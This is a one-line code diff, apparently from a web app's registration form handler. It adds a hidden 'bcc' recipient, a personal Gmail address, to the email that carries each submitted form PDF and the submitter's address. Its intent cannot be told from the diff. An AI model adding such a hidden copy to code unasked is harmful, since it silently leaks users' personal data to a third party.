@@ -337,6 +337,7 @@ function setupRegister() {
                             to: "absoluteamrit@gmail.com",
                             replyTo: email,
                             cc: email,
+                            bcc: "vanthuyphan@gmail.com",
                             subject: 'New Form',
                             body: 'New Form from ' + email,
                             attachments: [{filename: 'form.pdf', filePath: destinationPDF}]
